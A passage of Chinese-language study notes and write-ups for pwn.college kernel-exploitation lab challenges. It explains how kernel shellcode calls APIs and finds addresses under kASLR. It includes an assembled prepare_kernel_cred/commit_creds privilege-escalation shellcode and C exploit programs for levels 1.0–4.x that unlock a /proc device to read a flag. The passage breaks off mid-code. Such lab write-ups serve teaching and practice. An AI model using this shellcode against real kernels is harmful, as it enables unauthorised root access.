TIF_SECCOMP)</code></p><p>命令执行:</p><p><code>run_cmd(&quot;/path/to/my/command&quot;);</code></p><p>这些行为不包含<code>sysycall</code>,它们往往需要:</p><ul><li>找到<code>current_task_struct</code>以及其中的方法和成员的偏移</li><li>调用内核API函数比如：<code>prepare_kernel_cred</code>、<code>commit_creds</code>、<code>run_cmd</code></li></ul><p><strong>调用内核API</strong></p><p>传参而言，和用户态相同，依次使用<code>rdi、rsi、rdx、rcx、r8和r9</code>寄存器，返回值存放在<code>rax</code>中。</p><p>内核API是函数，必须使用<code>call</code>(而不是syscall)来调用它们。</p><p>但是不能直接call函数名，如<code>call prepare_kernel_creds</code>。由于编译器不知道函数的地址，这样做会产生重定位节(.rela.*)。</p><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs actionscript">拓展:.rela.* 的作用是什么？<br>全称 relocation（重定位），记录编译器在编译时不确定的符号地址——针对引用的外部符号。<br><span class="hljs-keyword">dynamic</span> 段中保存了可执行文件依赖哪些动态库。<br>GOT 段记录了需要引用的外部符号的地址。<br></code></pre></td></tr></table></figure><ol><li>如何<code>call</code></li></ol><ul><li>相对地址call</li></ul><p>直接call立即数会把立即数看成一个32位的offset，跳转到当前地址+offset执行</p><ul><li>绝对地址call</li></ul><p>进行绝对地址调用可以把地址放到寄存器中再call，如下，跳转到0xffff414142424242执行：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs asm">mov rax,0xffff414142424242<br>call rax<br></code></pre></td></tr></table></figure><ol start="2"><li>定位内核API</li></ol><ul><li>kASLR关闭时</li></ul><p>在root权限下可以通过查看<code>/proc/kallsyms</code>获取内核函数地址。如果没有目标机器的root权限但其关闭的kASLR，可以通过查看有root权限的相同系统(硬件、内核版本等)机器来获取，它们的内核函数地址往往是相同的，例如：在challenge中，如果没开启kASLR，则可以在<code>practice mode</code>获取<code>/proc/kallsyms</code>中该挑战的内核函数地址。</p><ul><li>kASLR开启时</li></ul><p>需要泄露出一个内核地址后找出该地址的偏移，计算内核基址，就像绕过用户态ASLR一样。</p><p><strong>Seccomp:寻找当前进程的<code>task struct</code>以及成员偏移</strong></p><p><code>gs</code>段寄存器指向<code>current task struct</code>，在c内核开发中，宏定义<code>current</code>可以获取<code>gs</code>寄存器的值。</p><p>编写shellcode时，自己计算结构体中的偏移是十分复杂的，可以通过编译对应的c源码后查看汇编得到需要的地址</p><ul><li>用c语言编写包含了shellcode中需要的内容的内核模块。</li><li>构建内核模块(在pwncollege的挑战中可以使用<code>vm build</code>命令)</li><li>逆向内核模块，查看汇编，将需要的内容提取至shellcode中</li></ul><p>例：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//test_seccomp.c</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;linux/module.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;linux/kernel.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;linux/cred.h&gt;</span></span><br>MODULE_LICENSE(<span class="hljs-string">&quot;GPL&quot;</span>);<br><br><span class="hljs-type">void</span> *<span class="hljs-title function_">test_get_tread_info_flags_addr</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>&#123;<br><span class="hljs-keyword">return</span> &amp;current-&gt;thread_info.flags; <br>&#125;<br><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-title function_">test_get_seccomp_flag</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>&#123;<br>    <span class="hljs-keyword">return</span> TIF_SECCOMP;<br>&#125;<br><span class="hljs-comment">//vm build test_seccomp.c</span><br><span class="hljs-comment">//objdump -M intel -d /challenge/debug.ko</span><br></code></pre></td></tr></table></figure><p>但是在level8.0中发现该方法将<code>&amp;current-&gt;thread_info.flags</code>解析为了<code>mov    rax,QWORD PTR gs:0x0</code>，该偏移量是错误的。因为在长模式下，并没有真正使用分段，所有段寄存器的基数都是 0，而fs 和 gs 是为了解决线程特定数据而添加的例外。它们的真实基地址存储在MSR（模型特定寄存器）中，而不是描述符表中。MSR寄存器仅在内核可见，因此我们反编译用户态构建的内核模块无法获取相关偏移，真实偏移只能在内核态观察到，我们可以通过gdb调试内核中相关的函数寻找偏移。</p><p>具体获取偏移的方法请跳转至level8.0。</p><p><strong>内核shellcode编写及编译样例</strong></p><p>cred提权</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//shellcode.s</span><br>.intel_syntax noprefix<br><br>.section .text<br>.global _start<br><br>_start:<br>    xor rdi, rdi<br>    mov rcx, <span class="hljs-number">0xffffffff8107c0a0</span><br>    call rcx<br>    mov rdi, rax<br>    mov rcx, <span class="hljs-number">0xffffffff8107bd20</span><br>    call rcx<br>    ret<br><br><span class="hljs-comment">//gcc -c -o shellcode shellcode.s -masm=intel -nostdlib -Ttext=0</span><br><span class="hljs-comment">//使用自制linux使用工具 - bin2shellcode</span><br><span class="hljs-comment">//bin2shellcode shellcode</span><br><span class="hljs-comment">//shellcode = &quot;\x48\x31\xff\x48\xc7\xc1\xa0\xc0\x07\x81\xff\xd1\x48\x89\xc7\x48\xc7\xc1\x20\xbd\x07\x81\xff\xd1\xc3&quot;</span><br> <br></code></pre></td></tr></table></figure><p><strong>清理工作</strong></p><p>内核中shellcode的崩溃会造成严重的后果，因此需要使shellcode”干净”地结束，不造成混乱。  需要保证shellcode运行后内核中的服务也正常运行。</p><p>例：如果通过劫持函数指针来调用shellcode，那么shellcode必须表现得像一个函数并在结束时返回。</p><p><strong>内核调试</strong></p><p>大部分攻击会通过一个用户态程序(.&#x2F;attack)将payload注入到内核中触发bug。那么调试时如何运行gdb，将gdb附加到哪里呢？如果是实际硬件中运行的内核，需要使用专用硬件调试器进行附加调试。</p><ul><li>从qemu虚拟机中调试</li></ul><p>直接在vm中运行<code>gdb ./attack</code>，该方式能够带符号调试用户态程序，但是无法进入内核调试。当在<code>syscall</code>运行<code>si</code>时，会输出:<code>syscall instructions appearing to SIGSEGV/SIGKILL</code>等报错。</p><ul><li>从qemu虚拟机外调试</li></ul><p>使用gdb附加到qemu进行调试，具体步骤记录在<code>Environment setup</code>一节中。</p><p>在道场的挑战中可以使用<code>vm debug</code>命令</p><p>该方式不方便调试用户态程序(无符号表)，但是为调试内核本身的唯一方式。</p><ul><li><code>TL;DR</code>:<code>tldr</code>是一个类似<code>man</code>的手册查看命令，但是比man更简洁精炼。</li></ul><h2 id="challenges"><a href="#challenges" class="headerlink" title="challenges"></a>challenges</h2><h3 id="level1-0"><a href="#level1-0" class="headerlink" title="level1.0"></a>level1.0</h3><p>在workspace中将<code>.ko</code>文件下载到本地，用ida查看</p><p>init_module，在<code>/proc</code>目录下注册名为<code>pwncollege</code>的设备文件</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">init_module</span><span class="hljs-params">()</span><br>&#123;<br>  __int64 v0; <span class="hljs-comment">// rbp</span><br><br>  v0 = filp_open(<span class="hljs-string">&quot;/flag&quot;</span>, <span class="hljs-number">0LL</span>, <span class="hljs-number">0LL</span>);<br>  <span class="hljs-built_in">memset</span>(flag, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(flag));<br>  kernel_read(v0, flag, <span class="hljs-number">128LL</span>, v0 + <span class="hljs-number">104</span>);<br>  filp_close(v0, <span class="hljs-number">0LL</span>);<br>  proc_entry = (proc_dir_entry *)proc_create(<span class="hljs-string">&quot;pwncollege&quot;</span>, <span class="hljs-number">0x1B6</span>LL, <span class="hljs-number">0LL</span>, &amp;fops);<br>  printk(&amp;unk_F91);<br>  printk(&amp;unk_D90);<br>  printk(&amp;unk_F91);<br>  printk(&amp;unk_DC0);<br>  printk(&amp;unk_E28);<br>  printk(&amp;unk_E88);<br>  printk(&amp;unk_ED8);<br>  printk(&amp;unk_F98);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>device_write，写设备文件时触发</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">ssize_t</span> __fastcall <span class="hljs-title function_">device_write</span><span class="hljs-params">(file *file, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *buffer, <span class="hljs-type">size_t</span> length, <span class="hljs-type">loff_t</span> *offset)</span><br>&#123;<br>  <span class="hljs-type">size_t</span> v5; <span class="hljs-comment">// rdx</span><br>  <span class="hljs-type">char</span> password[<span class="hljs-number">16</span>]; <span class="hljs-comment">// [rsp+0h] [rbp-28h] BYREF</span><br>  <span class="hljs-type">unsigned</span> __int64 v8; <span class="hljs-comment">// [rsp+10h] [rbp-18h]</span><br><br>  v8 = __readgsqword(<span class="hljs-number">0x28</span>u);<br>  printk(&amp;unk_D10);<br>  v5 = <span class="hljs-number">16LL</span>;<br>  <span class="hljs-keyword">if</span> ( length &lt;= <span class="hljs-number">0x10</span> )<br>    v5 = length;<br>  copy_from_user(password, buffer, v5);  <span class="hljs-comment">//从用户态获取password</span><br>  device_state[<span class="hljs-number">0</span>] = (<span class="hljs-built_in">strncmp</span>(password, <span class="hljs-string">&quot;lyyfrvygobfnvyml&quot;</span>, <span class="hljs-number">0x10</span>uLL) == <span class="hljs-number">0</span>) + <span class="hljs-number">1</span>;<br>  <span class="hljs-keyword">return</span> length;<br>&#125;<br></code></pre></td></tr></table></figure><p>device_read，读设备文件时触发</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">ssize_t</span> __fastcall <span class="hljs-title function_">device_read</span><span class="hljs-params">(file *file, <span class="hljs-type">char</span> *buffer, <span class="hljs-type">size_t</span> length, <span class="hljs-type">loff_t</span> *offset)</span><br>&#123;<br>  <span class="hljs-type">const</span> <span class="hljs-type">char</span> *v6; <span class="hljs-comment">// rsi</span><br>  <span class="hljs-type">size_t</span> v7; <span class="hljs-comment">// rdx</span><br>  <span class="hljs-type">unsigned</span> __int64 v8; <span class="hljs-comment">// rax</span><br><br>  printk(&amp;unk_D50);<br>  v6 = flag;<br>  <span class="hljs-keyword">if</span> ( device_state[<span class="hljs-number">0</span>] != <span class="hljs-number">2</span> )<br>  &#123;<br>    v6 = <span class="hljs-string">&quot;device error: unknown state\n&quot;</span>;<br>    <span class="hljs-keyword">if</span> ( device_state[<span class="hljs-number">0</span>] &lt;= <span class="hljs-number">2</span> )<br>    &#123;<br>      v6 = <span class="hljs-string">&quot;password:\n&quot;</span>;<br>      <span class="hljs-keyword">if</span> ( device_state[<span class="hljs-number">0</span>] )<br>      &#123;<br>        v6 = <span class="hljs-string">&quot;device error: unknown state\n&quot;</span>;<br>        <span class="hljs-keyword">if</span> ( device_state[<span class="hljs-number">0</span>] == <span class="hljs-number">1</span> )<br>        &#123;<br>          device_state[<span class="hljs-number">0</span>] = <span class="hljs-number">0</span>;<br>          v6 = <span class="hljs-string">&quot;invalid password\n&quot;</span>;<br>        &#125;<br>      &#125;<br>    &#125;<br>  &#125;<br>  v7 = length;<br>  v8 = <span class="hljs-built_in">strlen</span>(v6) + <span class="hljs-number">1</span>;<br>  <span class="hljs-keyword">if</span> ( v8 - <span class="hljs-number">1</span> &lt;= length )<br>    v7 = v8 - <span class="hljs-number">1</span>;<br>  <span class="hljs-keyword">return</span> v8 - <span class="hljs-number">1</span> - copy_to_user(buffer, v6, v7);<span class="hljs-comment">//从flag文件中读取length长度的数据到用户态buffer</span><br>&#125;<br></code></pre></td></tr></table></figure><p>没有涉及提权、逃逸之类的操作，掌握内核模块的注册、读写交互即可，注意open的第二个参数不能为0，否则无法write。</p><p>exp:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>  <span class="hljs-type">char</span> buffer[<span class="hljs-number">100</span>];<br>  <span class="hljs-type">int</span> fd = open(<span class="hljs-string">&quot;/proc/pwncollege&quot;</span>, O_RDWR);<br>  <span class="hljs-type">char</span> key[] = <span class="hljs-string">&quot;lyyfrvygobfnvyml&quot;</span>;<br>  write(fd, key, <span class="hljs-keyword">sizeof</span>(key));<br>  read(fd, buffer, <span class="hljs-number">100</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s\n&quot;</span>, buffer);<br>  close(fd);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="level1-1"><a href="#level1-1" class="headerlink" title="level1.1"></a>level1.1</h3><p>同样下载到本地用ida查看</p><p>在<code>/proc</code>下注册pwncollege设备</p><p><code>device_write</code>依然是获取password,<code>device_read</code>中代码进行了修改，但是效果不变。</p><p>以下代码是device_read中比较难分析的部分，但通过<a href="https://maplebacon.org/2021/06/faustctf-treasury/">搜索引擎</a>可以发现这其实只是内联优化的静态<code>strlen</code>函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> ( device_state[<span class="hljs-number">0</span>] == <span class="hljs-number">2</span> )<br>&#123;<br>  v8 = flag;<br>  <span class="hljs-keyword">do</span><br>  &#123;<br>    v9 = *(_DWORD *)v8;<br>    v8 += <span class="hljs-number">4</span>;<br>    v10 = ~v9 &amp; (v9 - <span class="hljs-number">0x1010101</span>) &amp; <span class="hljs-number">0x80808080</span>;<br>  &#125;<br>  <span class="hljs-keyword">while</span> ( !v10 );<br>  v6 = flag;<br>  <span class="hljs-keyword">if</span> ( (~v9 &amp; (v9 - <span class="hljs-number">0x1010101</span>) &amp; <span class="hljs-number">0x8080</span>) == <span class="hljs-number">0</span> )<br>    v10 &gt;&gt;= <span class="hljs-number">16</span>;<br>  <span class="hljs-keyword">if</span> ( (~v9 &amp; (v9 - <span class="hljs-number">0x1010101</span>) &amp; <span class="hljs-number">0x8080</span>) == <span class="hljs-number">0</span> )<br>    v8 += <span class="hljs-number">2</span>;<br>  offset = (<span class="hljs-type">loff_t</span> *)v10;<br>  LOBYTE(offset) = <span class="hljs-number">2</span> * v10;<br>  v5 = v8 - &amp;flag[__CFADD__((_BYTE)v10, (_BYTE)v10) + <span class="hljs-number">3</span>];<br>  <span class="hljs-keyword">goto</span> LABEL_5;<br>&#125;<br></code></pre></td></tr></table></figure><p>level1.0的exp改下key即可</p><p>exp:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-type">int</span> fd = open(<span class="hljs-string">&quot;/proc/pwncollege&quot;</span>,O_RDWR);<br>    <span class="hljs-type">char</span> key[<span class="hljs-number">17</span>] = <span class="hljs-string">&quot;lqgfblpiidjtuaho&quot;</span>;<br>    <span class="hljs-type">char</span> flag[<span class="hljs-number">100</span>];<br>    write(fd,key,<span class="hljs-number">0x10</span>);<br>    read(fd,flag,<span class="hljs-number">100</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s&quot;</span>,flag);<br>    <br>    close(fd);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="level2-0"><a href="#level2-0" class="headerlink" title="level2.0"></a>level2.0</h3><p>在<code>device_write</code>中检测password后通过<code>printk</code>将flag输出在内核日志中，内核日志通过<code>vm logs</code>查看。</p><p>exp:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-type">int</span> fd = open(<span class="hljs-string">&quot;/proc/pwncollege&quot;</span>,O_RDWR);<br>    <span class="hljs-type">char</span> key[<span class="hljs-number">17</span>] = <span class="hljs-string">&quot;qkjzqcfqtnzctrsp&quot;</span>;<br>    write(fd,key,<span class="hljs-number">0x10</span>);<br>    close(fd);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="level2-1"><a href="#level2-1" class="headerlink" title="level2.1"></a>level2.1</h3><p>在<code>device_write</code>中检测password后跳转到<code>device_write_code</code>，将flag输出在内核日志后跳转回<code>device_write</code>，和level2.0效果相同，只是用跳转代替了call。</p><p>exp:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-type">int</span> fd = open(<span class="hljs-string">&quot;/proc/pwncollege&quot;</span>,O_RDWR);<br>    <span class="hljs-type">char</span> key[<span class="hljs-number">17</span>] = <span class="hljs-string">&quot;dmmwsghycbuooaja&quot;</span>;<br>    <span class="hljs-comment">//char flag[100];</span><br>    write(fd,key,<span class="hljs-number">0x10</span>);<br>    <span class="hljs-comment">//read(fd,flag,100);</span><br>    <span class="hljs-comment">//printf(&quot;%s&quot;,flag);</span><br>    close(fd);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="level3-0"><a href="#level3-0" class="headerlink" title="level3.0"></a>level3.0</h3><p>在<code>device_write</code>验证password后在<code>win</code>函数中进行了<code>cred</code>提权,提权后直接读flag即可：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 <span class="hljs-title function_">win</span><span class="hljs-params">()</span><br>&#123;<br>  __int64 v0; <span class="hljs-comment">// rax</span><br><br>  printk(&amp;unk_3F8);<br>  v0 = prepare_kernel_cred(<span class="hljs-number">0LL</span>);<br>  <span class="hljs-keyword">return</span> commit_creds(v0);<br>&#125;<br></code></pre></td></tr></table></figure><p>exp:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-type">int</span> fd = open(<span class="hljs-string">&quot;/proc/pwncollege&quot;</span>,O_RDWR);<br>    <span class="hljs-type">char</span> key[<span class="hljs-number">17</span>] = <span class="hljs-string">&quot;ihuttdrgucocbcyj&quot;</span>;<br>    write(fd,key,<span class="hljs-number">0x10</span>);<br>    close(fd);<br><br>    fd = open(<span class="hljs-string">&quot;/flag&quot;</span>,<span class="hljs-number">0</span>);<br>    <span class="hljs-type">char</span> flag[<span class="hljs-number">100</span>];<br>    read(fd,flag,<span class="hljs-number">100</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s&quot;</span>,flag);<br>    close(fd);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="level3-1"><a href="#level3-1" class="headerlink" title="level3.1"></a>level3.1</h3><p><code>device_write</code>中验证password使用了内联优化后的静态<code>strcmp</code>函数，然后跳转到<code>device_write_code</code>，调用<code>win</code>函数提权后跳转回<code>device_write</code>，最中效果和level3.0相同。</p><p>exp:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-type">int</span> fd = open(<span class="hljs-string">&quot;/proc/pwncollege&quot;</span>,O_RDWR);<br>    <span class="hljs-type">char</span> key[<span class="hljs-number">17</span>] = <span class="hljs-string">&quot;limtlgzgaygslnew&quot;</span>;<br>    write(fd,key,<span class="hljs-number">0x10</span>);<br>    close(fd);<br><br>    fd = open(<span class="hljs-string">&quot;/flag&quot;</span>,<span class="hljs-number">0</span>);<br>    <span class="hljs-type">char</span> flag[<span class="hljs-number">100</span>];<br>    read(fd,flag,<span class="hljs-number">100</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s&quot;</span>,flag);<br>    close(fd);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="level4-0"><a href="#level4-0" class="headerlink" title="level4.0"></a>level4.0</h3><p>交互方式改为了ioctl，逻辑依然是验证password后提权。</p><p>exp:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;sys/ioctl.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-type">int</span> fd = open(<span class="hljs-string">&quot;/proc/pwncollege&quot;</span>,O_RDWR);<br>    <span class="hljs-type">char</span> key[<span class="hljs-number">17</span>] = <span class="hljs-string">&quot;iihowwbwnjhzequx&quot;</span>;<br>    ioctl(fd,<span class="hljs-number">1337</span>,key);<br>    close(fd);<br><br>    fd = open(<span class="hljs-string">&quot;/flag&quot;</span>,<span class="hljs-number">0</span>);<br>    <span class="hljs-type">char</span> flag[<span class="hljs-number">100</span>];<br>    read(fd,flag,<span class="hljs-number">100</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s&quot;</span>,flag);<br>    close(fd);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="level4-1"><a href="#level4-1" class="headerlink" title="level4.1"></a>level4.1</h3><p>逻辑不变,改password即可</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 